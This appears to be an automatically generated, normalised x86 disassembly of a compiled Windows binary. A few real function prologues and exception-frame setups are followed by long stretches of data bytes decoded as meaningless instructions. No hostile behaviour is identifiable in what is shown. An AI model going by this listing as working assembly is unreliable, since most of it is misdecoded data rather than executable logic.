mov [ fs : eax ] edx
push sub_43a1b5
retn
mov eax [ rw-data ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov eax rw-data
call sub_4058d0
mov eax rw-data
call sub_4058d0
mov eax rw-data
call sub_4058d0
mov eax rw-data
call sub_403f40
mov eax rw-data
call sub_4058d0
mov eax [ rw-data ]
call sub_439770
sub_43a1b8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_43a20a
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43a211
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_43a0cc
mov [ rw-data ] eax
mov eax [ rw-data ]
add eax 0x1c
call sub_4058d0
mov edx eax
mov eax [ rw-data ]
call sub_429bc0
sub_43a214
sbb [ edx + 0xc010043 ] ah
push esp
dec ebp
outsd
popad
insb
push edx
jae r-xdata
inc ebx
outsd
insb
je r-xdata
cmp al 0xd1
outsd
insb
jae r-xdata
add [ eax ] al
add [ eax + 0x7fffffff ] al
inc ebx
add [ ecx + edx * 8 + 0x33c80043 ] cl
inc eax
add [ ebx + esi + 0x31040040 ] bh
inc eax
add [ eax ] ah
xor [ eax ] eax
pop esp
xor [ eax ] eax
sub dl dl
inc ebx
add [ eax ] bl
rol [ ebx ] 0x1
adc al 0xd1
dec edi
bound ebp [ edx + 0x65 ]
arpl [ esp - 0x5d ] si
inc ebx
add [ edi ] al
or edx [ esp + eax * 2 + 0x72 ]
popad
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + esi * 8 - 0x5e ] si
inc ebx
add [ ecx + edx ] al
inc eax
add [ eax ] al
add [ eax ] cl
inc ebx
outsd
outsb
je r-xdata
nop
xor al 0xa2
inc ebx
add [ ecx ] al
pop es
push esp
inc ebx
jne r-xdata
inc eax
add al dh
mov [ 0x43 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc al 0xa3
jae r-xdata
add [ ecx + edx * 8 ] bh
inc ebx
add ah bh
rol [ ebx ] 0x1
lodsb [ esi ]
rol [ ebx ] 0x1
push ss
push esp
inc edx
popad
jae r-xdata
outsd
insb
jae r-xdata
xor eax [ eax ]
pushfd
rol [ ebx ] 0x1
mov ecx ss
inc ebx
add al cl
xor eax [ eax ]
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add [ ecx + esi + 0x40 ] bl
add ah dl
iretd
inc ebx
add ah bl
iretd
inc ebx
add [ eax + eax ] dh
add [ eax ] al
mov al 0x10
inc eax
add [ ebx + esi - 0x2e63ffc0 ] dh
inc ebx
add [ ecx + edx * 8 + 0x33c80043 ] cl
inc eax
add [ ebx + esi + 0x31040040 ] bh
inc eax
add [ eax ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx ] dl
jb r-xdata
add [ esp + r--data ] al
add [ eax ] al
inc esp
jb r-xdata
inc ebx
add [ eax ] bl
rol [ ebx ] 0x1
rcl cl 0x1
inc ebx
add ah bl
iretd
add [ ebx + 0x43a394c0 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
mov [ 0x3c0043 ] eax
add [ eax ] al
movsb [ edi ] [ esi ]
mov [ 0x33b40043 ] al
inc eax
add [ ecx + edx * 8 - 0x2e73ffbd ] bl
inc ebx
add al cl
xor eax [ eax ]
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add [ ecx + esi + 0x40 ] bl
add [ eax ] ch
rol [ ebx ] cl
sbb cl dl
inc ebx
add [ ecx + edx * 8 ] dl
add [ eax + 0x7fffffff ] al
add [ eax ] al
mov eax eax
dec esp
mov [ 0x6030043 ] al
push esp
inc ecx
insb
imul esp [ edi + 0x6e ] 0x1
add [ esi ] al
add [ eax ] al
add [ eax - 0x5e ] cl
inc ebx
add [ esi ] al
popad
insb
dec esi
outsd
outsb
add eax 0x6f546c61
jo r-xdata
dec eax
mov [ 0x33b40043 ] eax
inc eax
add [ ecx + edx * 8 - 0x2e73ffbd ] bl
inc ebx
add al cl
xor eax [ eax ]
inc ebx
add [ eax ] bl
rol [ ebx ] 0x1
rcl cl 0x1
inc ebx
add ah bl
iretd
add [ eax ] al
test [ ebx + eax * 2 + 0x4000 ] ah
add [ eax - 0x5d ] cl
inc ebx
add [ ebx + esi - 0x2e63ffc0 ] dh
inc ebx
add [ ecx + edx * 8 + 0x33c80043 ] cl
inc eax
inc ebx
outsd
outsb
je r-xdata
push es
popad
insb
dec esp
je r-xdata
popad
insb
inc edx
outsd
je r-xdata
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add [ ecx + esi + 0x40 ] bl
add [ eax ] ch
rol [ ebx ] cl
pop esp
rol [ ebx ] cl
je r-xdata
rol [ ebx ] 0x1
enter 0x4033 0x0
outsd
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx * 4 - 0x24 ] si
mov [ 0x16070043 ] eax
push esp
inc edx
popad
jae r-xdata
or [ ecx + 0x6c ] ah
inc ebx
insb
imul esp [ ebp + 0x6e ] 0x6c610874
inc ebx
jne r-xdata
popad
insb
push edx
imul esp [ edi + 0x68 ] 0x6c610874
xor [ eax ] eax
pop esp
xor [ eax ] eax
aam 0xcf
inc ebx
add [ eax ] bl
rol [ ebx ] 0x1
adc al 0xd1
inc ebx
add [ eax ] bl
rol [ ebx ] 0x1
jl r-xdata
outsd
insd
inc esp
jb r-xdata
inc ebx
add [ ebx ] cl
push esp
inc esp
jb r-xdata
xor cl dl
inc ebx
add [ ecx + edx * 8 ] dh
je r-xdata
add [ ebx + esi + 0x31040040 ] bh
inc eax
add [ eax ] ah
xor [ eax ] eax
pop esp
xor [ eax ] eax
sub dl dl
inc ebx
add [ edx + edx * 8 + 0x43 ] bl
inc ebx
outsd
outsb
je r-xdata
inc ebx
add [ ecx + edx * 8 ] bh
inc ebx
add [ eax ] dh
rol [ ebx ] 0x1
xor al 0xd1
outsb
je r-xdata
insd
or [ ebx + 0x6f ] al
add [ edx + edx * 8 + 0x43 ] dh
inc ebx
outsd
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ esp + edx * 4 - 0x5d ] si
inc ebx
add [ eax ] ah
mov [ 0x43 ] eax
or [ ebx + 0x6f ] al
outsb
je r-xdata
inc ebx
add [ eax - 0x3ffbc2e ] ah
rol [ ebx ] 0x1
lodsb [ esi ]
rol [ ebx ] 0x1
adc dl [ esp + eax * 2 + 0x72 ]
popad
inc ebx
outsd
outsb
je r-xdata
outsd
insb
jae r-xdata
rol [ ebx ] 0x1
mov al [ 0xfffffffffc0043d2 ]
rol [ ebx ] 0x1
lodsb [ esi ]
rol [ ebx ] 0x1
adc al 0x54
inc esp
jb r-xdata
outsd
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx * 4 - 0x1c ] si
movsb [ edi ] [ esi ]
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
movsd [ edi ] [ esi ]
inc ebx
add [ eax ] al
add [ eax ] al
add [ ebp - 0x5ba7ffc0 ] cl
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ebx
add [ eax + 0x140043d4 ] ah
inc ebx
outsd
outsb
je r-xdata
or al 0xa4
inc ebx
add [ ebx + esi - 0x2e63ffc0 ] dh
inc ebx
add al al
rol [ ebx ] cl
enter 0x4033 0x0
inc ebx
add [ eax ] bl
rol [ ebx ] 0x1
rcl cl 0x1
inc ebx
add ah bl
iretd
rol [ ebx ] 0x1
xor al 0xd1
inc ebx
add [ ecx + edx * 8 ] bh
inc ebx
add [ ebx + edx * 8 - 0x2d3bffbd ] dh
inc ebx
add ah bh
rol [ ebx ] cl
js r-xdata
outsd
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebp + eax * 2 + 0x78 ] si
lea eax [ eax ]
je r-xdata
inc ebx
add [ ecx + edx * 8 ] dl
inc ebx
add [ eax ] bl
rol [ ebx ] 0x1
pop eax
rol [ ebx ] cl
fmul st7
inc ebx
add [ eax ] dh
inc ebx
add [ esp + edx * 8 - 0x2b53ffbd ] cl
inc ebx
add [ edi ] cl
push esp
inc esp
jb r-xdata
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add [ ecx + esi + 0x40 ] bl
add [ eax ] ch
rol [ ebx ] cl
pop esp
rol [ ebx ] cl
je r-xdata
add al cl
xor eax [ eax ]
rol [ ebx ] 0x1
sbb al dl
inc ebx
add [ eax - 0x2d ] bl
inc ebx
add ah bl
iretd
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x700043a5 ] dh
add [ eax ] al
add [ eax - 0x5d ] cl
inc ebx
add [ ebx + esi - 0x2e63ffc0 ] dh
inc ebx
add [ ecx + edx * 8 + 0x33c80043 ] cl
inc eax
add [ ebx + esi + 0x31040040 ] bh
inc eax
add [ eax ] ah
xor [ eax ] eax
sub bl dl
inc ebx
add [ eax ] ch
rol [ ebx ] cl
mov al [ 0x140043d4 ]
inc ebx
add [ ebx + esi - 0x2e63ffc0 ] dh
inc ebx
add [ esp + edx * 8 + 0x33c80043 ] dh
inc eax
add [ ebx + esi + 0x31040040 ] bh
inc eax
add [ eax ] ah
xor [ eax ] eax
sub bl dl
inc ebx
add [ eax ] ch
rol [ ebx ] cl
mov al [ 0x140043d4 ]
inc esp
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ esp + eax * 8 - 0x5b ] si
inc ebx
add [ edi ] al
andps xmm0 [ edx + esi * 2 + 0x61 ]
inc esp
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ esp + esi * 2 - 0x5b ] si
inc ebx
add al bl
mov [ 0x43 ] eax
or [ ebx + 0x6f ] al
outsb
je r-xdata
add [ ecx + edx * 8 ] bh
inc ebx
add [ ebx + edx * 8 - 0x2d3bffbd ] dh
inc ebx
add ah bh
rol [ ebx ] cl
js r-xdata
outsd
insb
jae r-xdata
inc ebx
add [ ecx + edx * 8 ] dl
inc ebx
add [ eax ] bl
rol [ ebx ] 0x1
pop eax
rol [ ebx ] cl
fmul st7
inc ebx
add [ eax ] dh
rol [ ebx ] 0x1
xor al 0xd1
inc ebx
inc ebx
add [ esp + edx * 8 - 0x2b53ffbd ] cl
inc ebx
add [ ecx ] dl
push esp
inc esp
jb r-xdata
rol [ ebx ] 0x1
sbb al dl
inc ebx
add [ eax - 0x2d ] bl
inc ebx
add ah bl
iretd
add [ ebx + 0x43a638c0 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x43 ] dh
add [ eax ] dh
add [ eax ] al
sub [ ebp + 0x33b40043 ] ah
inc eax
add [ ecx + edx * 8 - 0x2b4bffbd ] bl
inc ebx
add al cl
xor eax [ eax ]
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add [ eax ] ch
rol [ ebx ] cl
sub dl dl
inc ebx
add [ eax + 0x140043d4 ] ah
inc ecx
add [ eax + 0x4c004184 ] ch
sub eax [ edx ]
cmp [ ebx ] ch
inc edx
add [ eax + 0xe0043e6 ] dh
push esp
inc ebx
outsd
outsb
je r-xdata
inc esp
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ ebp + eax * 2 + 0x78 ] si
mov eax eax
aam 0xa6
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmpsd [ esi ] [ edi ]
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ch
xor eax [ eax ]
add al 0x31
inc eax
add [ eax ] ah
xor [ eax ] eax
outsd
insb
inc ebx
popad
outsb
jbe r-xdata
inc ecx
add ah dh
call 0xffffffffefaba7bd
add ah al
xor eax [ eax ]
enter 0x4033 0x0
jae r-xdata
cmpsb [ esi ] [ edi ]
inc ebx
add [ eax + eax ] ah
add ah bl
add al 0x42
add [ ebx + esi + 0x33c00040 ] dh
inc eax
add ah al
xor eax [ eax ]
enter 0x4033 0x0
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add [ esi - 0x7a73ffbd ] al
inc ecx
add [ ebp + eax * 4 - 0x7b57ffbf ] dl
inc ecx
add [ ebx + ebp + 0x42 ] cl
add [ eax ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + 0x43 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
in al dx
add [ edi + 0xe070043 ] ah
push esp
inc ebx
outsd
outsb
je r-xdata
inc ecx
add [ ebx + ebp * 8 ] dl
inc ebx
add [ edi + ebp * 8 - 0x143fffbf ] bl
inc ebx
add ah ch
out dx al
inc ecx
add [ eax - 0x2bffbe11 ] al
out dx eax
outsd
insb
inc ebx
popad
outsb
jbe r-xdata
xor al 0xef
jae r-xdata
sub eax [ edx ]
mov al 0xe6
inc ebx
add [ esi ] cl
cmpsb [ esi ] [ edi ]
inc ebx
add [ eax + 0x5 ] cl
inc edx
add [ eax + eax ] al
or [ ebx + 0x6f ] al
outsb
je r-xdata
inc ecx
add [ eax ] al
0xbfd00043 0x44
outsd
insb
jae r-xdata
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add [ edi + ebp * 8 ] dh
add [ ebp - 0x588bffc0 ] cl
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dh
cmpsd [ esi ] [ edi ]
inc ebx
add [ eax + eax ] bl
add [ eax ] al
mov [ ecx + 0x33b40044 ] bh
inc eax
add al al
xor eax [ eax ]
les esi [ ebx ]
inc eax
add al cl
xor eax [ eax ]
sub_43a46e
inc ebx
add [ eax + 0x340043d2 ] al
rol [ ebx ] 0x1
mov al [ 0xfffffffffc0043d2 ]
rol [ ebx ] 0x1
lodsb [ esi ]
rol [ ebx ] 0x1
adc dl [ esp + eax * 2 + 0x72 ]
popad
inc ebx
outsd
outsb
je r-xdata
rol [ ebx ] 0x1
mov al [ 0xfffffffffc0043d2 ]
rol [ ebx ] 0x1
lodsb [ esi ]
rol [ ebx ] 0x1
adc al 0x54
inc esp
jb r-xdata
outsd
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx * 4 - 0x1c ] si
movsb [ edi ] [ esi ]
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
movsd [ edi ] [ esi ]
inc ebx
add [ eax ] al
add [ eax ] al
inc ebx
add [ eax + 0x140043d4 ] ah
inc ebx
outsd
outsb
je r-xdata
or al 0xa4
inc ebx
add [ ebx + esi - 0x2e63ffc0 ] dh
inc ebx
add al al
rol [ ebx ] cl
enter 0x4033 0x0
inc ebx
add [ eax ] bl
rol [ ebx ] 0x1
rcl cl 0x1
inc ebx
add ah bl
iretd
rol [ ebx ] 0x1
xor al 0xd1
inc ebx
add [ ecx + edx * 8 ] bh
inc ebx
add [ ebx + edx * 8 - 0x2d3bffbd ] dh
inc ebx
add ah bh
rol [ ebx ] cl
js r-xdata
outsd
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebp + eax * 2 + 0x78 ] si
lea eax [ eax ]
je r-xdata
inc ebx
add [ ecx + edx * 8 ] dl
inc ebx
add [ eax ] bl
rol [ ebx ] 0x1
pop eax
rol [ ebx ] cl
fmul st7
inc ebx
add [ eax ] dh
inc ebx
add [ esp + edx * 8 - 0x2b53ffbd ] cl
inc ebx
add [ edi ] cl
push esp
inc esp
jb r-xdata
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add [ ecx + esi + 0x40 ] bl
add [ eax ] ch
rol [ ebx ] cl
pop esp
rol [ ebx ] cl
je r-xdata
add al cl
xor eax [ eax ]
rol [ ebx ] 0x1
sbb al dl
inc ebx
add [ eax - 0x2d ] bl
inc ebx
add ah bl
iretd
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x700043a5 ] dh
add [ eax ] al
add [ eax - 0x5d ] cl
inc ebx
add [ ebx + esi - 0x2e63ffc0 ] dh
inc ebx
add [ ecx + edx * 8 + 0x33c80043 ] cl
inc eax
add [ ebx + esi + 0x31040040 ] bh
inc eax
add [ eax ] ah
xor [ eax ] eax
sub bl dl
inc ebx
add [ eax ] ch
rol [ ebx ] cl
mov al [ 0x140043d4 ]
inc ebx
add [ ebx + esi - 0x2e63ffc0 ] dh
inc ebx
add [ esp + edx * 8 + 0x33c80043 ] dh
inc eax
add [ ebx + esi + 0x31040040 ] bh
inc eax
add [ eax ] ah
xor [ eax ] eax
sub bl dl
inc ebx
add [ eax ] ch
rol [ ebx ] cl
mov al [ 0x140043d4 ]
inc esp
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ esp + eax * 8 - 0x5b ] si
inc ebx
add [ edi ] al
andps xmm0 [ edx + esi * 2 + 0x61 ]
inc esp
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ esp + esi * 2 - 0x5b ] si
inc ebx
add al bl
mov [ 0x43 ] eax
or [ ebx + 0x6f ] al
outsb
je r-xdata
add [ ecx + edx * 8 ] bh
inc ebx
add [ ebx + edx * 8 - 0x2d3bffbd ] dh
inc ebx
add ah bh
rol [ ebx ] cl
js r-xdata
outsd
insb
jae r-xdata
inc ebx
add [ ecx + edx * 8 ] dl
inc ebx
add [ eax ] bl
rol [ ebx ] 0x1
pop eax
rol [ ebx ] cl
fmul st7
inc ebx
add [ eax ] dh
rol [ ebx ] 0x1
xor al 0xd1
inc ebx
inc ebx
add [ esp + edx * 8 - 0x2b53ffbd ] cl
inc ebx
add [ ecx ] dl
push esp
inc esp
jb r-xdata
rol [ ebx ] 0x1
sbb al dl
inc ebx
add [ eax - 0x2d ] bl
inc ebx
add ah bl
iretd
add [ ebx + 0x43a638c0 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x43 ] dh
add [ eax ] dh
add [ eax ] al
sub [ ebp + 0x33b40043 ] ah
inc eax
add [ ecx + edx * 8 - 0x2b4bffbd ] bl
inc ebx
add al cl
xor eax [ eax ]
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add [ eax ] ch
rol [ ebx ] cl
sub dl dl
inc ebx
add [ eax + 0x140043d4 ] ah
inc ecx
add [ eax + 0x4c004184 ] ch
sub eax [ edx ]
cmp [ ebx ] ch
inc edx
add [ eax + 0xe0043e6 ] dh
push esp
inc ebx
outsd
outsb
je r-xdata
inc esp
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ ebp + eax * 2 + 0x78 ] si
mov eax eax
aam 0xa6
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmpsd [ esi ] [ edi ]
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ch
xor eax [ eax ]
add al 0x31
inc eax
add [ eax ] ah
xor [ eax ] eax
outsd
insb
inc ebx
popad
outsb
jbe r-xdata
inc ecx
add ah dh
call 0xffffffffefaba7bd
add ah al
xor eax [ eax ]
enter 0x4033 0x0
jae r-xdata
cmpsb [ esi ] [ edi ]
inc ebx
add [ eax + eax ] ah
add ah bl
add al 0x42
add [ ebx + esi + 0x33c00040 ] dh
inc eax
add ah al
xor eax [ eax ]
enter 0x4033 0x0
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add [ esi - 0x7a73ffbd ] al
inc ecx
add [ ebp + eax * 4 - 0x7b57ffbf ] dl
inc ecx
add [ ebx + ebp + 0x42 ] cl
add [ eax ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + 0x43 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
in al dx
add [ edi + 0xe070043 ] ah
push esp
inc ebx
outsd
outsb
je r-xdata
inc ecx
add [ ebx + ebp * 8 ] dl
inc ebx
add [ edi + ebp * 8 - 0x143fffbf ] bl
inc ebx
add ah ch
out dx al
inc ecx
add [ eax - 0x2bffbe11 ] al
out dx eax
outsd
insb
inc ebx
popad
outsb
jbe r-xdata
xor al 0xef
jae r-xdata
sub eax [ edx ]
mov al 0xe6
inc ebx
add [ esi ] cl
cmpsb [ esi ] [ edi ]
inc ebx
add [ eax + 0x5 ] cl
inc edx
add [ eax + eax ] al
or [ ebx + 0x6f ] al
outsb
je r-xdata
inc ecx
add [ eax ] al
0xbfd00043 0x44
outsd
insb
jae r-xdata
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add [ edi + ebp * 8 ] dh
add [ ebp - 0x588bffc0 ] cl
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dh
cmpsd [ esi ] [ edi ]
inc ebx
add [ eax + eax ] bl
add [ eax ] al
mov [ ecx + 0x33b40044 ] bh
inc eax
add al al
xor eax [ eax ]
les esi [ ebx ]
inc eax
add al cl
xor eax [ eax ]
sub_43a4fa
inc ebx
add [ eax + 0x340043d2 ] al
rol [ ebx ] 0x1
mov al [ 0xfffffffffc0043d2 ]
rol [ ebx ] 0x1
lodsb [ esi ]
rol [ ebx ] 0x1
adc al 0x54
inc esp
jb r-xdata
inc ebx
add [ eax + 0x140043d4 ] ah
inc ebx
outsd
outsb
je r-xdata
rol [ ebx ] 0x1
xor al 0xd1
inc ebx
add [ ecx + edx * 8 ] bh
inc ebx
add [ ebx + edx * 8 - 0x2d3bffbd ] dh
inc ebx
add ah bh
rol [ ebx ] cl
js r-xdata
outsd
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebp + eax * 2 + 0x78 ] si
lea eax [ eax ]
je r-xdata
inc ebx
add [ ecx + edx * 8 ] dl
inc ebx
add [ eax ] bl
rol [ ebx ] 0x1
pop eax
rol [ ebx ] cl
fmul st7
inc ebx
add [ eax ] dh
inc ebx
add [ esp + edx * 8 - 0x2b53ffbd ] cl
inc ebx
add [ edi ] cl
push esp
inc esp
jb r-xdata
add al cl
xor eax [ eax ]
rol [ ebx ] 0x1
sbb al dl
inc ebx
add [ eax - 0x2d ] bl
inc ebx
add ah bl
iretd
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x700043a5 ] dh
add [ eax ] al
add [ eax - 0x5d ] cl
inc ebx
add [ ebx + esi - 0x2e63ffc0 ] dh
inc ebx
add [ ecx + edx * 8 + 0x33c80043 ] cl
inc eax
add [ ebx + esi + 0x31040040 ] bh
inc eax
add [ eax ] ah
xor [ eax ] eax
sub bl dl
inc ebx
add [ eax ] ch
rol [ ebx ] cl
mov al [ 0x140043d4 ]
inc ebx
add [ ebx + esi - 0x2e63ffc0 ] dh
inc ebx
add [ esp + edx * 8 + 0x33c80043 ] dh
inc eax
add [ ebx + esi + 0x31040040 ] bh
inc eax
add [ eax ] ah
xor [ eax ] eax
sub bl dl
inc ebx
add [ eax ] ch
rol [ ebx ] cl
mov al [ 0x140043d4 ]
inc esp
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ esp + eax * 8 - 0x5b ] si
inc ebx
add [ edi ] al
andps xmm0 [ edx + esi * 2 + 0x61 ]
inc esp
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ esp + esi * 2 - 0x5b ] si
inc ebx
add al bl
mov [ 0x43 ] eax
or [ ebx + 0x6f ] al
outsb
je r-xdata
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add [ ecx + esi + 0x40 ] bl
add [ eax ] ch
rol [ ebx ] cl
pop esp
rol [ ebx ] cl
je r-xdata
or al 0xa4
inc ebx
add [ ebx + esi - 0x2e63ffc0 ] dh
inc ebx
add al al
rol [ ebx ] cl
enter 0x4033 0x0
inc ebx
add [ eax ] bl
rol [ ebx ] 0x1
rcl cl 0x1
inc ebx
add ah bl
iretd
add [ ecx + edx * 8 ] bh
inc ebx
add [ ebx + edx * 8 - 0x2d3bffbd ] dh
inc ebx
add ah bh
rol [ ebx ] cl
js r-xdata
outsd
insb
jae r-xdata
inc ebx
add [ ecx + edx * 8 ] dl
inc ebx
add [ eax ] bl
rol [ ebx ] 0x1
pop eax
rol [ ebx ] cl
fmul st7
inc ebx
add [ eax ] dh
rol [ ebx ] 0x1
xor al 0xd1
inc ebx
inc ebx
add [ esp + edx * 8 - 0x2b53ffbd ] cl
inc ebx
add [ ecx ] dl
push esp
inc esp
jb r-xdata
rol [ ebx ] 0x1
sbb al dl
inc ebx
add [ eax - 0x2d ] bl
inc ebx
add ah bl
iretd
add [ ebx + 0x43a638c0 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x43 ] dh
add [ eax ] dh
add [ eax ] al
sub [ ebp + 0x33b40043 ] ah
inc eax
add [ ecx + edx * 8 - 0x2b4bffbd ] bl
inc ebx
add al cl
xor eax [ eax ]
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add [ eax ] ch
rol [ ebx ] cl
sub dl dl
inc ebx
add [ eax + 0x140043d4 ] ah
inc ecx
add [ eax + 0x4c004184 ] ch
sub eax [ edx ]
cmp [ ebx ] ch
inc edx
add [ eax + 0xe0043e6 ] dh
push esp
inc ebx
outsd
outsb
je r-xdata
inc esp
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ ebp + eax * 2 + 0x78 ] si
mov eax eax
aam 0xa6
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmpsd [ esi ] [ edi ]
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ch
xor eax [ eax ]
add al 0x31
inc eax
add [ eax ] ah
xor [ eax ] eax
outsd
insb
inc ebx
popad
outsb
jbe r-xdata
inc ecx
add ah dh
call 0xffffffffefaba7bd
add ah al
xor eax [ eax ]
enter 0x4033 0x0
jae r-xdata
cmpsb [ esi ] [ edi ]
inc ebx
add [ eax + eax ] ah
add ah bl
add al 0x42
add [ ebx + esi + 0x33c00040 ] dh
inc eax
add ah al
xor eax [ eax ]
enter 0x4033 0x0
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add [ esi - 0x7a73ffbd ] al
inc ecx
add [ ebp + eax * 4 - 0x7b57ffbf ] dl
inc ecx
add [ ebx + ebp + 0x42 ] cl
add [ eax ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + 0x43 ] ah
add [ eax ] al
